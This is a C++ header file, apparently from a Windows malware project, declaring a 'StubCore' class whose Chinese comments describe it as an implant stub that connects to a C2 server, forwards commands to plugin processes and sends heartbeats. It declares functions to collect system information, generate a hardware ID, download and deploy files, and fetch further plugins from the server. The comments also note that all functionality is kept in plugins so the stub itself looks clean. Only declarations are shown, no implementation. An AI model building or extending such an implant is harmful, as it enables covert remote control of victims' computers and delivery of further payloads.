#pragma once
#include "PluginLoader.h"
#include <string>
#include <atomic>
#include <thread>
#include <windows.h>
#include <wininet.h>

// ═══════════════════════════════════════════════
// Stub 核心 —— 只做三件事：
//   1. 连接 C2 服务端
//   2. 转发指令给 MCP 插件进程
//   3. 心跳保活
//
// 所有功能都在插件里，Stub 本身是干净的网络客户端
// ═══════════════════════════════════════════════

class StubCore {
public:
    StubCore();
    ~StubCore();

    void run(const std::wstring& pluginDir);

private:
    // 网络
    bool connectToServer();
    bool httpPost(const std::string& path, const std::string& body, std::string& response);
    std::string httpGet(const std::string& path);
    bool httpDownload(const std::string& url, const std::wstring& savePath);

    // 循环
    void pollLoop();
    void heartbeatLoop();

    // 信息采集
    std::string collectSystemInfo();
    std::string generateHWID();

    // 部署
    void handleDeployFile(const std::string& params);

    // 插件同步：从服务端拉取缺失的插件
    void syncPlugins(const std::wstring& pluginDir);

    std::string _serverUrl;
    std::string _hwid;
    PluginLoader _plugins;
    std::atomic<bool> _running{false};
    std::thread _heartbeatThread;
    HINTERNET _hSession = nullptr;
};
